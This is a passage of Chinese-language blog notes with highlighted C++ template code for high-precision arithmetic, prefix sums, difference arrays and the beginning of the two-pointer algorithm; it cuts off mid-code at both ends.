class="comment">// C = A + B</span></span><br><span class="line"><span class="function">vector&lt;<span class="keyword">int</span>&gt; <span class="title">sub</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt; &amp;A, vector&lt;<span class="keyword">int</span>&gt; &amp;B)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    vector&lt;<span class="keyword">int</span>&gt; C;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>, t = <span class="number">0</span>; i &lt; A.<span class="built_in">size</span>(); i ++)</span><br><span class="line">    &#123;</span><br><span class="line">        t = A[i] - t;         <span class="comment">//给t当前A的值</span></span><br><span class="line">        <span class="keyword">if</span> (i &lt; B.<span class="built_in">size</span>()) t -= B[i];     <span class="comment">//判断减数是否存在</span></span><br><span class="line">        C.<span class="built_in">push_back</span>((t + <span class="number">10</span>) % <span class="number">10</span>);      <span class="comment">//t是可能小于0的 </span></span><br><span class="line">        <span class="keyword">if</span> (t &lt; <span class="number">0</span>) t = <span class="number">1</span>;        <span class="comment">//查看高位的运算是否减一，即是否借位</span></span><br><span class="line">        <span class="keyword">else</span> t = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> (C.<span class="built_in">size</span>() &gt; <span class="number">1</span> &amp;&amp; C.<span class="built_in">back</span>() == <span class="number">0</span>)  <span class="comment">//留1位(此时这个数在数组的最高位)， 防止差刚好为0</span></span><br><span class="line">        C.<span class="built_in">pop_back</span>();                      <span class="comment">//back()函数返回末尾元素的引用，pop_back()则是删除  末尾元素——这里是前几位可能多出来的0</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> C;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    string a, b;</span><br><span class="line">    vector&lt;<span class="keyword">int</span>&gt;A, B;</span><br><span class="line">    </span><br><span class="line">    cin &gt;&gt; a &gt;&gt; b;   <span class="comment">// a = &quot;123456&quot;</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = a.<span class="built_in">size</span>() - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i --) A.<span class="built_in">push_back</span>(a[i] - <span class="string">&#x27;0&#x27;</span>); <span class="comment">//A = [&#x27;6&#x27;...&#x27;1&#x27;]</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = b.<span class="built_in">size</span>() - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i --) B.<span class="built_in">push_back</span>(b[i] - <span class="string">&#x27;0&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">cmp</span>(A, B))    <span class="comment">//判断A、B大小</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">auto</span> C = <span class="built_in">sub</span>(A, B);     <span class="comment">//在声明变量时根据变量初始值的类型自动为变量匹配类型，代替冗长复杂的 变量和使用范围专一的变量声明</span></span><br><span class="line">      <span class="keyword">for</span> (<span class="keyword">int</span> i = C.<span class="built_in">size</span>() - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i --) <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, C[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">auto</span> C = <span class="built_in">sub</span>(B, A);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;-&quot;</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = C.<span class="built_in">size</span>() - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i --) <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, C[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="3、高精度乘法"><a href="#3、高精度乘法" class="headerlink" title="3、高精度乘法"></a>3、高精度乘法</h4><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20211209093752464.png" alt="image-20211209093752464"></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function">vector&lt;<span class="keyword">int</span>&gt; <span class="title">mul</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt; &amp;A, <span class="keyword">int</span> b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    vector&lt;<span class="keyword">int</span>&gt; C;</span><br><span class="line">    <span class="keyword">int</span> t = <span class="number">0</span>;<span class="comment">//表示进位      </span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; A.<span class="built_in">size</span>() || t; i ++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (i &lt; A.<span class="built_in">size</span>()) t += A[i] * b;</span><br><span class="line">        C.<span class="built_in">push_back</span>(t % <span class="number">10</span>);</span><br><span class="line">        t /= <span class="number">10</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">while</span> (C.<span class="built_in">size</span>() &gt; <span class="number">1</span> &amp;&amp; C.<span class="built_in">back</span>() == <span class="number">0</span>) C.<span class="built_in">pop_back</span>();<span class="comment">//去掉前几位多余的0</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> C;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    string a;</span><br><span class="line">    <span class="keyword">int</span> b;</span><br><span class="line">    </span><br><span class="line">    cin &gt;&gt; a &gt;&gt; b;<span class="comment">// a = &quot;123456&quot;</span></span><br><span class="line"></span><br><span class="line">    vector&lt;<span class="keyword">int</span>&gt; A;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = a.<span class="built_in">size</span>() - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i --) A.<span class="built_in">push_back</span>(a[i] - <span class="string">&#x27;0&#x27;</span>); <span class="comment">//A = [&#x27;6&#x27;...&#x27;1&#x27;]</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">auto</span> C = <span class="built_in">mul</span>(A, b);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = C.<span class="built_in">size</span>() - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i --) <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, C[i]);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="4、高精度除法"><a href="#4、高精度除法" class="headerlink" title="4、高精度除法"></a>4、高精度除法</h4><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20211209102614579.png" alt="image-20211209102614579"></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function">vector&lt;<span class="keyword">int</span>&gt; <span class="title">div</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt; &amp;A, <span class="keyword">int</span> b, <span class="keyword">int</span> &amp;r)</span>  <span class="comment">//  A / B，商是C，余数为r</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    vector&lt;<span class="keyword">int</span>&gt; C;</span><br><span class="line">    r = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = A.<span class="built_in">size</span>() - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i --)</span><br><span class="line">    &#123;</span><br><span class="line">        r = r * <span class="number">10</span> + A[i];</span><br><span class="line">        C.<span class="built_in">push_back</span>(r / b);</span><br><span class="line">        r %= b;</span><br><span class="line">    &#125;   </span><br><span class="line">    <span class="built_in">reverse</span>(C.<span class="built_in">begin</span>(), C.<span class="built_in">end</span>());</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (C.<span class="built_in">size</span>() &gt; <span class="number">1</span> &amp;&amp; C.<span class="built_in">back</span>() == <span class="number">0</span>) C.<span class="built_in">pop_back</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> C;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    string a;</span><br><span class="line">    <span class="keyword">int</span> b;</span><br><span class="line">    </span><br><span class="line">    cin &gt;&gt; a &gt;&gt; b;<span class="comment">// a = &quot;123456&quot;</span></span><br><span class="line"></span><br><span class="line">    vector&lt;<span class="keyword">int</span>&gt; A;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = a.<span class="built_in">size</span>() - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i --) A.<span class="built_in">push_back</span>(a[i] - <span class="string">&#x27;0&#x27;</span>); <span class="comment">//A = [&#x27;6&#x27;...&#x27;1&#x27;]</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">int</span> r;</span><br><span class="line">    <span class="keyword">auto</span> C = <span class="built_in">div</span>(A, b, r);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = C.<span class="built_in">size</span>() - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i --) <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, C[i]);</span><br><span class="line">    cout &lt;&lt; endl &lt;&lt; r &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h3 id="4、前缀和"><a href="#4、前缀和" class="headerlink" title="4、前缀和"></a>4、前缀和</h3><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20211231235014330.png" alt="image-20211231235014330"></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> N = <span class="number">100010</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> n, m;</span><br><span class="line"><span class="keyword">int</span> a[N], s[N];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>, &amp;n, &amp;m);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; i ++) <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;a[i]);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; i ++) s[i] = s[i - <span class="number">1</span>] + a[i];       <span class="comment">//数组的初始化, s[0] = 0</span></span><br><span class="line"><span class="comment">//从1开始，避免下标转换</span></span><br><span class="line">    <span class="keyword">while</span> (m --)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">int</span> l, r;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>, &amp;l, &amp;r);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, s[r] - s[l - <span class="number">1</span>]);        <span class="comment">//区间和的计算</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>二维</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20220104234325946.png" alt="image-20220104234325946"></p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20220101004754647.png" alt="image-20220101004754647"></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> N = <span class="number">1010</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> n, m, q;</span><br><span class="line"><span class="keyword">int</span> a[N][N], s[N][N];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d%d%d&quot;</span>, &amp;n, &amp;m, &amp;q);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; i ++)</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">1</span>; j &lt;= m; j ++)</span><br><span class="line">            <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;a[i][j]);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; i ++)</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">1</span>; j &lt;= m; j ++)</span><br><span class="line">                s[i][j] = s[i - <span class="number">1</span>][j] + s[i][j - <span class="number">1</span>] - s[i - <span class="number">1</span>][j - <span class="number">1</span>] + a[i][j];</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">while</span> (q --)</span><br><span class="line">    &#123;</span><br><span class="line"><span class="keyword">int</span> x1, y1, x2, y2;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d%d%d%d&quot;</span>, &amp;x1, &amp;y1, &amp;x2, &amp;y2);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, s[x2][y2] - s[x1 - <span class="number">1</span>][y2] - s[x2][y1 - <span class="number">1</span>] + s[x1 - <span class="number">1</span>][y1 - <span class="number">1</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h3 id="5、差分-前缀和的逆运算"><a href="#5、差分-前缀和的逆运算" class="headerlink" title="5、差分(前缀和的逆运算)"></a>5、差分(前缀和的逆运算)</h3><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20220101012009660.png" alt="image-20220101012009660"></p><p> <img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20220101013717858.png" alt="image-20220101013717858"></p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20220101222900127.png" alt="image-20220101222900127"></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> N = <span class="number">100010</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> n, m;</span><br><span class="line"><span class="keyword">int</span> a[N], b[N];<span class="comment">//b[N]是a[N]的差分，a[N]是b[N]的前缀和</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">insert</span><span class="params">(<span class="keyword">int</span> l, <span class="keyword">int</span> r, <span class="keyword">int</span> c)</span><span class="comment">//b[i] = a[i] - a[i-1]</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    b[l] += c;<span class="comment">//b[i] = a[i] (在b[1]的时候不用判断减0了)</span></span><br><span class="line">    b[r + <span class="number">1</span>] -= c;<span class="comment">//提前把下一项改减的给它</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>, &amp;n, &amp;m);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; i ++) <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;a[i]);<span class="comment">//a[0]为0，后面就不用单独看下标了</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; i ++) <span class="built_in">insert</span>(i, i, a[i]);<span class="comment">//这里通过函数建立了a[]和b[]的联系</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">while</span> (m --)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">int</span> l, r, c;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d%d%d&quot;</span>, &amp;l, &amp;r, &amp;c);</span><br><span class="line">        <span class="built_in">insert</span>(l, r, c);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; i ++) b[i] += b[i - <span class="number">1</span>];<span class="comment">//求前缀和数组，b[i]就等于b[i]的值和前</span></span><br><span class="line">    <span class="comment">//面数和（此时为前一项）的和</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; i ++) <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, b[i]);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>假定a数组最开始都是0，那么b数组初始时就是a数组的差分数组了，对于每一个a[i]，相当于插入了一个数，可以直接调用insert函数即可，当然也可以从差分数组的定义出发，for(int i=1;i&lt;=n;i) b[i]=a[i]-a[i-1]; </p><p>二维</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20220101020530866.png" alt="image-20220101020530866"></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> N = <span class="number">1010</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> n, m, q;</span><br><span class="line"><span class="keyword">int</span> a[N][N], b[N][N];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">insert</span><span class="params">(<span class="keyword">int</span> x1, <span class="keyword">int</span> y1, <span class="keyword">int</span> x2, <span class="keyword">int</span> y2, <span class="keyword">int</span> c)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    b[x1][y1] += c;</span><br><span class="line">    b[x2 + <span class="number">1</span>][y1] -= c;</span><br><span class="line">    b[x1][y2 + <span class="number">1</span>] -= c;</span><br><span class="line">    b[x2 + <span class="number">1</span>][y2 + <span class="number">1</span>] += c;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d%d%d&quot;</span>, &amp;n, &amp;m, &amp;q);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n ; i ++)</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">1</span>; j &lt;= m; j ++)</span><br><span class="line">            <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;a[i][j]);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; i ++)</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">1</span>; j &lt;= m; j ++)</span><br><span class="line">            <span class="built_in">insert</span>(i, j, i, j, a[i][j]);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">while</span> (q --)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">int</span> x1, y1, x2, y2, c;</span><br><span class="line">        cin &gt;&gt; x1 &gt;&gt; y1 &gt;&gt; x2 &gt;&gt; y2 &gt;&gt; c;</span><br><span class="line">        <span class="built_in">insert</span>(x1, y1, x2, y2, c);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; i ++)</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">1</span>; j &lt;= m; j ++)</span><br><span class="line">            b[i][j] += b[i - <span class="number">1</span>][j] + b[i][j - <span class="number">1</span>] - b[i - <span class="number">1</span>][j - <span class="number">1</span>];<span class="comment">//二维前缀和</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; i ++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">1</span>; j &lt;= m; j ++) <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, b[i][j]);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">            </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h3 id="6、双指针算法"><a href="#6、双指针算法" class="headerlink" title="6、双指针算法"></a>6、双指针算法</h3><p>归并排序就属于双指针算法</p><p>第一类 —— 两个序列</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20220107093441413.png" alt="image-20220107093441413"></p><p>第二类 —— 一个序列</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20220107093514297.png" alt="image-20220107093514297"></p><p>模板例子</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20220107093637967.png" alt="image-20220107093637967"></p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20220107093916628.png" alt="image-20220107093916628"></p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20220107100944211.png" alt="image-20220107100944211"></p><p>例1：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> str[<span 